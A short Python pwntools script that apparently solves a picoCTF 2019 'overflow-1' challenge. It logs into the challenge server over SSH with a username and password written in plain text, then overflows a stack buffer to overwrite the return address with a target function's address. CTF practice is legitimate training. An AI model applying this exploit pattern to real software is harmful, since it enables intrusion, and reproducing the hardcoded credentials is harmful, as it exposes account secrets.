#coding=utf-8
from pwn import *

vuln = 0x8048700
target = 0x080485e6
buf = 0xffffd470
ret = 0xffffd4bc

debug = 0
if debug:
    p = process('./vuln')
else:
    s = ssh(host = '2019shell1.picoctf.com', user = 'zeze', password = 'h9h9ji3g4go6')
    s.set_working_directory('/problems/overflow-1_4_812671dab452fa07b5cfa764e02219b0')
    p = s.process('./vuln')

p.sendline('a' * (ret - buf) + p32(target))
p.interactive()
